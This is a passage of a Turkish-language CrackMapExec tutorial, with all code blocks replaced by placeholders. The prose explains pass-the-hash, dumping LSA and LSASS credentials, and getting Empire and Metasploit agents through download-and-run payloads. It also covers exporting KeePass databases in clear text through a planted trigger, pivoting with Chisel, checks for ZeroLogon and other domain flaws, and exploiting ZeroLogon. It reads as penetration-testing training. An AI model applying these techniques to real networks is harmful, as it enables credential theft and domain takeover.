{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için `Pass the Hash` tekniğini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren `-H` seçeneğine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent çalıştırmadan hash dump işlemi gerçekleştiren `impacket-secretsdump`'tan alınmış `--lsa` seçeneğiyle birlikte gelir. Bu seçenek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak üzere LSA Secrets'ı dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır


### LSA'yı inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile başlayan hash formatı `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayıf bir parola belirlenmişse `Hashcat` kullanılarak kırılabilir çünkü bu algoritma `NTLM`'den çok daha güçlüdür. Ayrıca, Domain Cached Credential hash'leri `Pas the Hash` saldırısı için kullanılamaz. Bunları kırmak için, domain ve kullanıcı adını kaldırmamız, `$DCC2$` 'den sonraki değeri almamız ve Hashcat modül 2100'ü kullanmamız gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleği, Windows parolalarını `açık metin` olarak veya `NTLM` veya `AES256/AES128` gibi diğer hash biçimlerini içerir. Belleği dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak için etkili bir yol olabilir.

CrackMapExec, LSASS process belleğinin içeriğini dump etmek için çeşitli modüller içerir. Bunlardan bazılarını görelim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracı, bir dizi host üzerindeki kimlik bilgilerini remote olarak ayıklamak için kullanılır. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazısı nasıl çalıştığını açıklamaktadır. Bu araç, bir LSASS dump'ındaki gerekli baytları remote okumak için `Impacket` projesini ve kimlik bilgilerini çıkarmak için `pypykatz` kullanır.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluşturmak için Sysinternals'tan Microsoft `Procdump`'ı ve kimlik bilgilerini çıkarmak için `pypykatz`'ı kullanır.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracı, **LSASS**'e ait kopyalanmış **handle**'ların kullanımını göstererek, aynı **process**'in **gizlenmiş** bir bellek dump'ını oluşturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'ını oluşturan esnek bir araçtır. **LSASS**'e bir **handle** açmak tespit edilebileceğinden, **Nanodump** mevcut **handle**'ları arayabilir. Eğer bir **handle** bulunursa, bunu kopyalayıp **minidump** oluşturmak için kullanır. Ancak, böyle bir **handle** bulunacağının garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bölgesi veya başka bir kaynak** ile etkileşime geçmesini sağlayan **benzersiz bir tanımlayıcıdır**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bölümde bir bilgisayardan veya domain'den kimlik bilgilerini almak için farklı yöntemler gösterilmektedir. Bir sonraki bölümde CrackMapExec'in bir C2 framework ile birlikte kullanımı incelenecektir.

---


### Bir **C2 Framework** içinde **session**'ları alma.

CrackMapExec ile ilginç olabilecek bir şey, birden fazla hedefi tehlikeye attığımızda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak çalışmak isteyebiliriz. Her hedef makinede bir payload çalıştırmak ve C2'mize bir `agent` almak için CrackMapExec'i kullanabiliriz.

Bu bölümde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modül ele alınacaktır. Ayrıca farklı bir C2 framework'ü kullanırsak bir alternatif de keşfedeceğiz.


### Empire

Web sitelerinde sağlanan [kılavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'ü yükleyerek başlayacağız


### Empire Server'ı Kurun ve Başlatın

{{CODE_BLOCK_176}}

Daha sonra Empire'ı seçtiğimiz kullanıcı adı ve şifre ile çalıştırmamız gerekiyor. Biz `empireadmin` kullanıcı adını ve `asdasd123` şifresini kullanacağız! .


### Empire'ı Özel Kullanıcı Adı ve Parola ile Çalıştırma

{{CODE_BLOCK_177}}

Ardından, CrackMapExec yapılandırma dosyasını ve Empire client yapılandırma dosyasını seçtiğimiz kullanıcı adı ve parolayla eşleşecek şekilde düzenlememiz gerekir.

CrackMapExec yapılandırma dosyası varsayılan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seçeneğini `empireadmin` kullanıcı adı ve `asdasd123` şifresiyle eşleşecek şekilde değiştirmemiz gerekiyor! . Varsayılan olarak, Empire local server `1337` portunda çalışır. CrackMapExec yapılandırma dosyasında değiştirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


Aynı şeyi Empire yapılandırma dosyası için de yapmamız gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### İnceleme

{{CODE_BLOCK_179}}


Yapılandırma dosyaları değiştirildikten sonra, Empire client ile Empire sunucusuna bağlanmalıyız

{{CODE_BLOCK_180}}

Şimdi listener'ı ayarlamamız gerekiyor ve host'u IP adresimize ve Port'u da aracının bağlanacağı TCP 8001'e ayarlayacağız.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

Artık listener'ımız çalışıyor ve `empire_exec` modülü ile Empire'a bir `agent` almak için CrackMapExec'i kullanabiliriz. Ayarladığımız listener olan `LISTENER=http` seçeneğini eklememiz gerekiyor.


### CrackMapExec Modülünü Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu çalıştırdığımızda, PowerShell Empire'da yeni bir agent görmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

Aynı şeyi CrackMapExec modülü `web_delivery` kullanarak Metasploit Framework üzerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modülünü yapılandırmamız ve sağlanan URL'yi CrackMapExec modülümüze bir parametre olarak kullanmamız gerekir. Msfconsole'u başlatalım ve `web_delivery` handler'ını yapılandıralım


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapılandırıldıktan sonra web_delivery modülünü kullanabiliriz. `URL` ve `PAYLOAD` olmak üzere iki seçeneği destekler. URL seçeneğini Metasploit tarafından sağlanan URL ile ayarlamamız gerekir ve PAYLOAD seçeneği seçtiğimiz payload mimarisine karşılık gelir. Eğer `x64` kullanıyorsak, `x64` varsayılan değer olduğu için bu seçeneği atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. Eğer `32 bit` payload kullanıyorsak `PAYLOAD=32` seçeneğini ayarlamamız gerekir. Şimdi bunu çalışırken görelim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum görmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

Başka bir C2 Framework kullanmak istediğimizde, **Command Execution** bölümünde bahsedilen (SMB, WinRM, SSH) yöntemleri kullanarak aynı sonucu elde edebiliriz. Örneğin, bir **PowerShell** payload'u oluşturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip çalıştırmak için **-X** seçeneğiyle bir PowerShell komutu çalıştırabiliriz. Ayrıca, işlemi arka planda yürütmek için **`--no-output`** seçeneğini seçmemiz gerekecektir.

Örnek olarak Metasploit'i kullanalım ve modülü kullanmak yerine web_delivery payload'unda sağlanan PowerShell script'ini kopyalamayı deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bölüm, CrackMapExec'i C2 Frameworks gibi diğer bilgisayar korsanlığı araçlarıyla nasıl kullanabileceğimizi araştırıyor. Bir sonraki bölümde CrackMapExec'in BloodHound ile nasıl entegre edileceği incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldırganlar hem de savunmacılar tarafından alan güvenliğini analiz etmek için kullanılan açık kaynaklı bir araçtır. Araç, domain'den toplanan büyük miktarda veriyi alır. İlişkiyi görsel olarak temsil etmek ve geleneksel numaralandırma ile tespit edilmesi zor veya imkansız olan domain saldırı yollarını belirlemek için grafik teorisini kullanır. Bu bölümde Bloodhound'a aşina olduğunuzu varsayıyoruz. 


### **BloodHound**'da **Owned** olarak işaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geçirilmiş (owned) olarak işaretleyebiliriz. Bunu yapmak için node'a sağ tıklayıp **`Mark X as Owned`** seçeneğine tıklamamız yeterlidir. Bu, ele geçirdiğimiz kullanıcıları ve bilgisayarları takip etmek açısından faydalıdır, özellikle büyük bir organizasyonla çalışırken. Ayrıca, **`Shortest Path from Owned Principals`** (Ele Geçirilmiş Principal'dan En Kısa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele Geçirilmiş Principal'dan Domain Adminlerine En Kısa Yollar) gibi bir BloodHound cypher sorgusu gerçekleştirmek istediğimizde de kullanışlıdır.

CrackMapExec'i, ele geçirdiğimiz herhangi bir user veya computer'ı BloodHound veritabanında `owned` olarak işaretleyecek şekilde yapılandırabiliriz. Bunu yapmak için, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapılandırma dosyasını aşağıdaki seçeneklerle değiştirmemiz gerekir:

* Bloodhound yapılandırma seçeneği `bh_enabled`'ı `True` olarak ayarlayın.
* `bh_uri`'yi Bloodhound veritabanı `IP` adresimize ayarlayın.
* `bh_port`'u veritabanı `portuna` ayarlayın
* Kimlik bilgilerini bloodhound veritabanıyla eşleşecek şekilde ayarlayın: kullanıcı adı `neo4j` ve şifre `asdasd123` (Veritabanınıza karşılık geleni kullandığınızdan emin olun).

Yapılandırma aşağıdaki gibi görünmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: Bağlandığınız BloodHound veritabanına karşılık gelen kullanıcı adı ve parolayı kullandığınızdan emin olun.

### Bloodhound Verilerinin Toplanması

BloodHound verilerini toplamak için CrackMapExec kullanarak SharpHound'u çalıştıracak ve ardından dosyayı saldırı hostumuza aktaracağız.

### BloodHound verilerinin toplanması

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Şimdi BloodHound'u açmamız ve verileri içe aktarmamız gerekiyor.


### BloodHound'da Kullanıcıları Owned Olarak Ayarlama

Veriler içe aktarıldıktan sonra, `robert` kullanıcısı ile bağlanmaya çalışırsak, kullanıcıyı BloodHound veritabanında owned olunan olarak ayarlayacaktır.

### Kullanıcı BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanıcısı olan bir makineyi tehlikeye atarsak da aynı şey olacaktır. Bulunan tüm yeni kullanıcıları owned olarak ayarlayacaktır.

### Procdump Modülü ile Kullanıcıları Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: Tüm CrackMapExec seçenekleri BloodHound veritabanı ile senkronize olmayacaktır. Örneğin, `--ntds` veya `--lsa` seçeneklerini denersek, kullanıcıları veritabanında sahip olunan olarak işaretlemez, ancak `procdump` veya `lsassy` gibi modüller kullanıcıları sahip olunan olarak işaretler.


### BloodHound'da Bilgisayarları Owned Olarak Ayarlama

Yazım sırasında, BloodHound entegrasyonu yalnızca user'ları Owned olarak işaretlemektedir. Bir `computer` owned olarak işaretlemek istiyorsak, `bh_owned` modülünü ve `neo4j` veritabanımızın kullanıcı adı ve şifresini kullanabiliriz. Aşağıdaki örnekte, diğer varsayılan değerler neo4j veritabanımızla eşleştiği için yalnızca `PASS` seçeneğini ekleyeceğiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, büyük ağlarla uğraşırken birçok seçenek sunar ve müşterilerimizle paylaşmak istememiz durumunda veritabanını güncellemenin hızlı bir yoludur. Bir sonraki bölümde, CrackMapExec'te mevcut olan bazı popüler modüllerle çalışacağız.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici şeylerden biri, modüler olması ve herkesin modüller oluşturmasına ve bunları araca katkıda bulunmasına izin vermesidir. CrackMapExec, exploit ve exploit sonrası görevleri kolaylaştırmak için işlemler gerçekleştirmemizi sağlayan 50'den fazla modüle sahiptir. Bu bölümde LDAP ve SMB protokolleri için bu modüllerden bazıları incelenecektir.


### LDAP Protocol Modules

LDAP protokolü yaygın olarak Domain Controller'lar ile etkileşime geçmemizi ve onlardan bilgi almamızı sağlar. Active Directory'den ilginç bilgiler çıkarmamızı sağlayacak bazı modülleri gözden geçirelim.


### **LDAP Module - get-network**

`get-network` modülü [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'ı  temel alır. Varsayılan olarak, Active Directory'deki herhangi bir kullanıcı, `zone transferine` benzer şekilde Domain veya Forest DNS bölgelerindeki tüm DNS kayıtlarını numaralandırabilir. Bu araç, internal ağların yeniden yapılandırılması amacıyla bölgedeki tüm DNS kayıtlarının numaralandırılmasını ve dışa aktarılmasını sağlar.

Modülü kullanmanın üç (3) yolu vardır:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adları).

Varsayılan olarak, herhangi bir seçenek belirtmezsek, modül yalnızca IP adresini alacaktır. `ALL=true` seçeneğini seçersek, hem IP hem de domain adlarını alır ve `ONLY_HOSTS=true` olarak belirtirsek, yalnızca FQDN'yi alırız.


### DNS Sunucusundan (Record) Kayıtları Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazının yazıldığı zamanda, modül **`adidnsdump`** aracıyla bazı farklılıklar göstermektedir. Sonuçlar, hesaplar arasında farklılık gösterebilir.


### LDAP Module - laps

Bir başka harika modül de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e bağlı bilgisayarlarda local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL'ler tarafından korunur, böylece yalnızca belirli kullanıcılar bunları okuyabilir veya `parola sıfırlama` talebinde bulunabilir. Laps modülü ile bir hesabın okuma erişimine sahip olduğu tüm bilgisayarları alabiliriz. Bir bilgisayarı belirtmek için `COMPUTER` seçeneğini de kullanabilir veya benzer ada sahip birkaç bilgisayarı almak için bir wildcard karakterle birlikte kullanabiliriz.


### LAPS Modülü Parolaların Alınması

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: Kullanılan parola bir örnektir. Hedef hostta çalışmayacaktır

### LDAP Modülü - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'ü ile temsil edilen ve varsayılan olarak bir **user**'ın bir **domain** içinde oluşturabileceği **computer account** sayısını belirten bir **domain level attribute**'tür.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazı **attack** senaryolarında **domain** içinde bir **machine** oluşturmak gerekebilir, bu yüzden **account machine quota attribute**'ünü **enumerate** etmek önemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir başka harika modül ise bir veya birden fazla object'in `DACL`'lerini okumamızı ve dışa aktarmamızı sağlayan `daclread`'dir. Bu modül Active Directory erişimini numaralandırmamızı sağlayacaktır. Aşağıdaki seçeneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabının tüm **ACE**'lerini okumak istiyoruz. Bunun için **`TARGET`** seçeneğini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace Kullanıcısının DACL'sini Oku

{{CODE_BLOCK_203}}


Ayrıca belirli hakları da arayabiliriz, örneğin hangi **principal**'ların **DCSync** haklarına sahip olduğunu. Bunun için **`TARGET_DN`** seçeneğini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seçeneğini seçmemiz ve aramak istediğimiz hakları **`RIGHTS`** seçeneğiyle belirlememiz gerekir.

### DCSync Rights'a Sahip Kullanıcıları Arama

{{CODE_BLOCK_204}}



Çıktıda gösterildiği gibi, `ACE[4]` `robert` kullanıcısının hedef domain'de `DCSync` haklarına sahip olduğunu gösterir.

LDAP'ta birkaç modül daha kullanabiliriz. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolünde daha fazla modül mevcuttur. CrackMapExec modülünde yaptığımız şeylerin çoğu SMB protokolünü kullanır. İlginç bilgiler elde etmemizi sağlayacak bazı modülleri gözden geçirelim.

Not: SMB kullanan modüllerin çoğunun çalışması için admin haklarına ( `Pwned!` ) ihtiyaç vardır.


### SMB Modülleri - get_netconnections ve ioxidresolver

Bir ağ pentesti üzerinde çalışırken, sürekli olarak daha fazla kaynağa veya ağa erişim elde etmeye çalışırız. CrackMapExec, daha önce tehlikeye attığımız bir makineyi numaralandırmamıza ve birden fazla ağ yapılandırmasına sahip olup olmadığını belirlememize olanak tanıyan bazı modüllere sahiptir. `get_netconnections` ve `ioxidresolver` modüllerini kullanalım ve farklarını görelim.

`get_netconnections` modülü, ağ bağlantılarını sorgulamak için `WMI` kullanır. `IPv6` ve herhangi bir ikincil IP dahil olmak üzere tüm IP adreslerinin yanı sıra domain adını da alır.


### get_netconnections Module

{{CODE_BLOCK_206}}


Öte yandan, `ioxidresolver` modülü IP adreslerini sorgulamak için RPC kullanır. Ancak, bu modül `IPv6` adreslerini içermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: İhtiyaçlarımıza en uygun olanı seçebilmemiz için bir modülün nasıl çalıştığını anlamak önemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal ağlarda adminler ve kullanıcılar tarafından parolaları ve gizli bilgileri tek bir veritabanında saklamak için yaygın olarak kullanılan ücretsiz, açık kaynaklı bir password manager'dır. Bir master password onu korur. Bir KeePass veritabanı alırsak, onu açmak için şifresine ihtiyacımız vardır.

### KeePass'i Keşfetme

{{CODE_BLOCK_208}}

Eğer master parolaya sahip değilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafından geliştirilen ve veritabanını açık metin olarak dışa aktarmak için KeePass'ın triger sistemini kullanan bir teknik kullanmaktır. KeePass yapılandırma dosyasını, veritabanını otomatik olarak açık metin olarak dışa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) içerecek şekilde değiştirir.

Bunu kullanmak için beş (5) adıma ihtiyacımız var:

*  KeePass yapılandırma dosyasını bulun. Biz bunu `keepass_discover` modülü ile yaptık.
 * `ACTION=ADD` seçeneğini ve `KEEPASS_CONFIG_PATH` öğesini kullanarak trigger'ı yapılandırma dosyasına ekleyin.

### KeePass Yapılandırma Dosyasına Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapılandırma yolu için ters eğik çizgi (`/`) veya çift eğik çizgi (`\`) kullandığınızdan emin olun.

* Kullanıcının KeePass'i açmasını ve master parolayı girmesini bekleyin. Bu işlemi zorlamak için `ACTION=RESTART` seçeneğini kullanarak KeePass.exe prosesini yeniden başlatabiliriz. Hedef makinede oturum açmış çok sayıda kullanıcı varsa, `USER=julio` gibi kullanıcı adı ile `USER` seçeneğini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seçeneğini kullanarak export edilen veritabanını makinemize sorgulayın. Daha sonra şifre girişlerini aramak için grep kullanabiliriz.


### Ele Geçirilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seçeneğini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapılandırma dosyasını temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modülün her seçeneğini öğrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seçeneğin iyi yanı, **extract_password** yöntemini de içermesidir; bu yöntem **.xml** dosyasında herhangi bir parola girişini arar ve konsola yazdırır.


### keeppass_trigger TÜMÜNÜ Tek Komutta Çalıştırma

{{CODE_BLOCK_214}}

Not: Modül şifreyi yazdırırken sorun yaşayabilir. Bir hata alabiliriz, ancak şifre `/tmp/export.xml` dosyasında olacaktır, böylece manuel olarak alabiliriz.

### RDP'yi Etkinleştirme veya Devre Dışı Bırakma

Değerlendirme yaparken yapmak isteyebileceğimiz yaygın bir görev, RDP aracılığıyla bir hedef makineye bağlanmaktır. Bu, başka türlü lateral hareket saldırıları gerçekleştiremediğimiz veya standart bir protokol kullanarak radarın altından geçmek istediğimiz bazı senaryolarda yararlı olabilir.

Bağlanmak istediğimiz makinede RDP etkin değilse, buna izin vermek için RDP modülünü kullanabiliriz. `ACTION` seçeneğini ve ardından `enable` veya `disable` seçeneklerini belirtmemiz gerekir.


### RDP'yi Etkinleştirme

{{CODE_BLOCK_215}}


SMB'de birkaç modül daha vardır. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bölümde, ZeroLogon gibi bilinen güvenlik açıklarından yararlanan diğer SMB modüllerine bakacağız

### Vulnerability Scan Modules

Sızma testi yaparken gerçekleştirdiğimiz günlük faaliyetlerden biri güvenlik açıklarını tespit etmeye çalışmaktır. Eğer herhangi birini bulabilirsek, exploitation işi basit olabilir.

CrackMapExec, güvenlik açıklarını tespit etmemizi sağlayan bazı modüller içerir. Bu oturumda bunlardan bazılarını inceleyeceğiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geçirdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki ağ kartı var ve amacımız domainin saldırıya karşı savunmasız olup olmadığını belirlemek. Domainin IP adresi `172.16.10.3`'tür.

Domain'e erişim sağlamak için, CME ile ProxyChain bölümünde öğrendiklerimizi kullanacağız ve Chisel ile bir bağlantı kuracağız


### Chisel'i Hedef Makineye Gönderme

{{CODE_BLOCK_217}}


### Saldırı Hostumuzda Chisel'ı Sunucu Olarak Çalıştırma

{{CODE_BLOCK_218}}


### Chisel'ı Tehlikeye Düşmüş Cihazdan Saldırı Hostumuza Bağlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki güvenlik açığı modüllerinin çoğu yalnızca kontrol edilir ve bu modülleri güvenlik açıklarından yararlanmak için kullanamayız. [ZeroLogon güvenlik açığı](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile başlayalım.


### ZeroLogon

Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in controller'ı ele geçirmek için savunmasız bir Netlogon session'ı başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.

CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.


### ZeroLogon Güvenlik Açığı Kontrolü

{{CODE_BLOCK_220}}


### PetitPotam

Güvenlik araştırmacısı [Gilles Lionel](https://twitter.com/topotam77) kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu servisine (örneğin bir Domain Controller) yönelik klasik bir `NTLM relay` saldırısıdır. Lionel ayrıca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir proof of  concept kodu da yayınladı.

CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan `petitpotam` adlı bir modül içerir.


### Petitpotam Güvenlik Açığı Kontrolü

{{CODE_BLOCK_221}}


### noPAC

noPAC güvenlik açığının exploit'i, normal bir domain kullanıcısının ayrıcalıklarının bir domain admin yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.

CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin controller'ı ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.

Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü `dfscoerce`'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için `Y3t4n0th3rP4ssw0rd` şifresiyle `carole.holmes` hesabını kullanacağız.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.

CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( `logging.debug` ) ile bazı debug log'ları eklediğini göreceğiz. CrackMapExec'i hata debug modunda çalıştırırsak, bu logları yazdıracaktır.

CrackMapExec'i debug modunda çalıştırmak için protokolden önce `--verbose` seçeneğini kullanabiliriz


### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma

{{CODE_BLOCK_225}}


`DEBUG` ile başlayan satırlar `logging.debug`'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB servisindeki kritik bir kimliği doğrulanmamış remote kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### Güvenlik Açığından Yararlanma

Birçok güvenlik açığı gördük. Onlardan birini exploit etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.

---

### Kendi CME Modülümüzü Oluşturmak

Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.


### CrackMapExec'i Poetry ile derleyin

Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın

